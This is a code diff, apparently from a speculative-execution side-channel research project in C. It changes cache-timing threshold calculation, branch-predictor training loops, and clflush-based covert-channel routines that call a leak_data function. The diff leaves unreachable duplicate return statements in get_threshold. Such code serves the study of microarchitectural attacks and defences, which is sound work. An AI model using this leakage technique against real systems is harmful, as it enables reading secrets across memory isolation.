@@ -57,16 +57,21 @@ size_t get_average_time(size_t (*function_to_measure)(uint8_t *address))
 
 size_t get_threshold(uint8_t covert_channel)
 {
+    size_t flushed = get_average_time(access_flushed);
+    size_t cached = get_average_time(access_cached);
     if (covert_channel == 0)
     {
+        return cached + ((flushed - cached) / 2);
         return get_average_time(access_flushed) - get_average_time(access_cached);
     }
     else if (covert_channel == 1)
     {
+        return cached + ((flushed - cached) / 2);
         return get_average_time(access_flushed) - get_average_time(access_cached);
     }
     else if (covert_channel == 2)
     {
+        return cached + ((flushed - cached) / 2);
         return get_average_time(access_flushed) - get_average_time(access_cached);
     }
 }
@@ -93,10 +98,10 @@ uint64_t transfer_bitwise(void (*asm_encode)(uint64_t data, uint8_t *channel,
     uint32_t out_index = 0;
     bool training;
 
-    uint32_t train_data[train_data_length * stride];
-    for (uint32_t i; i < train_data_length * stride; i += stride)
+    uint32_t train_data[(train_data_length * stride)+1];
+    for (uint32_t i = 0; i < (train_data_length * stride)+1; i += stride)
     {
-        train_data[i] = i + 1;
+        train_data[i] = i;
     }
 
     // empty the output
@@ -104,8 +109,7 @@ uint64_t transfer_bitwise(void (*asm_encode)(uint64_t data, uint8_t *channel,
 
     memset(side_channel, 5, ((bits_count + 2) * stride));
 
-    for (uint32_t i; i < train_data_length * stride; i += stride)
-        clflush(&train_data[i]);
+    clflush(&train_data[(train_data_length*stride)]);
 
     if (covert_channel == 0 || covert_channel == 2)
     {
@@ -128,7 +132,7 @@ uint64_t transfer_bitwise(void (*asm_encode)(uint64_t data, uint8_t *channel,
     // training the predictor
     if (train_data_length > 0)
     {
-        for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
+        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
         {
             // using 0 as secret, so no adresses are loaded into cache
             training = leak_data(asm_encode, i, train_data, train_data_length * stride, 0, side_channel, bits_count, stride);
@@ -155,10 +159,10 @@ uint64_t transfer_array_index(void (*asm_encode)(uint64_t data, uint8_t *channel
     uint32_t out_index = 0;
     bool training;
 
-    uint32_t train_data[train_data_length * stride];
-    for (uint32_t i; i < train_data_length * stride; i += stride)
+    uint32_t train_data[(train_data_length * stride)+1];
+    for (uint32_t i = 0; i < (train_data_length * stride) + 1; i += stride)
     {
-        train_data[i] = i + 1;
+        train_data[i] = i;
     }
 
     // empty the output
@@ -166,8 +170,7 @@ uint64_t transfer_array_index(void (*asm_encode)(uint64_t data, uint8_t *channel
 
     memset(side_channel, 5, channel_array_size);
 
-    for (uint32_t i; i < train_data_length * stride; i+=stride)
-        clflush(&train_data[i]);
+    clflush(&train_data[(train_data_length*stride)]);
 
     if (covert_channel == 0 || covert_channel == 2)
     {
@@ -190,7 +193,7 @@ uint64_t transfer_array_index(void (*asm_encode)(uint64_t data, uint8_t *channel
     // training the predictor
     if (train_data_length > 0)
     {
-        for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
+        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
         {
             // using 0 as secret, so no adresses are loaded into cache
             training = leak_data(asm_encode, i, train_data, train_data_length * stride, 0, side_channel, bits_count, stride);
